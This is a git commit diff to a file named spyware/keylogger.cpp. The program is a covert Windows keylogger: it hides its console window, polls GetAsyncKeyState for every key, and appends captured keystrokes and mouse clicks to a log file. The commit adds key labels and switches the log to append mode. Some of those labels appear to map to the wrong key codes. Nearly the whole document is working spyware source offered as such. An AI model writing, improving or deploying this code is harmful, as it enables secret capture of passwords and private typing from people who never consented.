51360eba8be5eb0267bc040b436bd5faa54d3e85
binarioGH <lacuentafalsadediegojonas@gmail.com>
2019-04-23 21:52:51 -0700

    mejoras

--- spyware/keylogger.cpp
+++ spyware/keylogger.cpp
@@ -5,6 +5,7 @@
 using namespace std;
 
 void hideConsole(void);
+int getMinusc(char letter);
 
 int main(int nArgs, char* argv[]){
 	hideConsole();
@@ -23,14 +24,27 @@ int main(int nArgs, char* argv[]){
 	}
 	log.close();
 	int count = 0;
-	char key;
+	bool mayusc = false;
 	int chr = 0;
 	while(true){
 		for(chr=0;chr<=255;chr++){
 			if(GetAsyncKeyState(chr) == -32767){
-				log.open(file, ios::out);
-				log<<char(chr);
+				cout<<chr;
+				log.open(file, ios::app);
+				switch(chr){
+					case 1:log<<"[CLICK IZQUIERDO]";break;
+					case 2:log<<"[CLICK DERECHO]";break;
+					case 8:log<<"[TAB]";break;
+					case 12:log<<"[ALT]";break;
+					case 14:
+					    if(mayusc){mayusc=false;}
+					    else{mayusc=true;}
+					break;
+					default:
+					log<<char(chr);
+				}
 				if(count == 50){
+					cout<<endl;
 					log<<"\n";
 					count = 0;
 				}
@@ -49,4 +63,3 @@ void hideConsole(void){
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	return;
 }
-
